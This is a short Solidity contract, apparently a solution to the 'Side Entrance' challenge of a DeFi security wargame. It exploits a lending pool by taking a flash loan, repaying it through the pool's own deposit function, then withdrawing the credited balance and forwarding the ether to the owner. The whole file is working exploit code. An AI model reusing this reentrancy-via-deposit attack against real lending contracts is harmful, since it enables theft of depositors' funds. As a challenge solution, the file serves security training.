// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import {Address} from "openzeppelin-contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function flashLoan(uint256) external;

    function withdraw() external;
}

contract SideEntranceAttacker {
    using Address for address payable;

    ISideEntranceLenderPool internal immutable pool;
    address payable internal owner;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
        owner = payable(msg.sender);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function borrow(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function withdraw() external {
        pool.withdraw();
    }

    fallback() external payable {
        owner.sendValue(msg.value);
    }
}
